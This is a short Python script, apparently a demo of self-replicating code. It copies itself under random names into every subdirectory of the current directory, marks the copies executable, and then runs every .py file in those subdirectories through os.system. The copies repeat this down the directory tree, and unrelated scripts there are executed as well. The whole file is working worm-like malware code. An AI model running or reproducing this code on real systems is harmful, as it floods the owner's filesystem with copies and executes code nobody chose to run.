import sys
import os
import random
import string


def getRandomString(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def copyFileToAnother(finput,foutput):
    with open(finput, "r") as f:
        with open(foutput, "w") as f1:
            for line in f:
                f1.write(line)
    os.chmod(foutput,0o775)

def getSubdirectories(path):
    my_dir = []
    directory_contents = os.listdir(path)
    for item in directory_contents:
        if os.path.isdir(item):
            my_dir.append(item)
    print("DEBUG: getSubdirectories:", my_dir)
    return my_dir

def sprayToSubDir(actualpath,filename,dirList):
    for dir in dirList:
        newFilename = getRandomString(8)+".py"
        print("DEBUG: sprayToSubDir: copy of "+filename +" to '"+actualpath+"/"+dir+"/"+newFilename+"'")
        copyFileToAnother(filename,actualpath+"/"+dir+"/"+newFilename)

def relaunch(actualpath,dirList):
    for dir in dirList:
        os.system("python "+actualpath+"/"+dir+"/*.py")
        print("DEBUG: relaunch: 'python "+actualpath+"/"+dir+"/*.py'")


def main(argv):
    if len(argv) != 1:
        print("usage: python {0}".format(argv[0]))
        sys.exit(1)
    print("-------------------------------")
    dirpath = os.getcwd()
    print("DEBUG: main, actualpath='"+dirpath+"'")
    subdirectories = getSubdirectories(dirpath)
    sprayToSubDir(dirpath,argv[0],subdirectories)
    relaunch(dirpath,subdirectories)
    print("-------------------------------")

if __name__ == "__main__":
    main(sys.argv)